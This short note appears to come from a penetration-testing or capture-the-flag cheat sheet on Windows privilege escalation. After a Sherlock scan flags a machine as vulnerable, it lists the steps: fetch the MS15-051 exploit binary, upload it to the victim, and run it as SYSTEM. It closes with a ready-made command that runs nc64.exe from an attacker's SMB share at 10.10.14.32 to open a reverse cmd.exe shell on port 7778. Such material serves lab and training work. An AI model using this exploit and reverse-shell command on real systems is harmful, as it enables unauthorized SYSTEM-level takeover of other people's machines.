You ran Sherlock and found that the machine appears to be vulnearable. Hurray!

1) Make sure to download the right architecture (32/64bit) for exploit.
2) Upload file to victim and run command as System
3) Get reverse shell using smb file share 
eg. ms15-051x64.exe "\\10.10.14.32\a\nc64.exe 10.10.14.32 7778 -e cmd.exe"
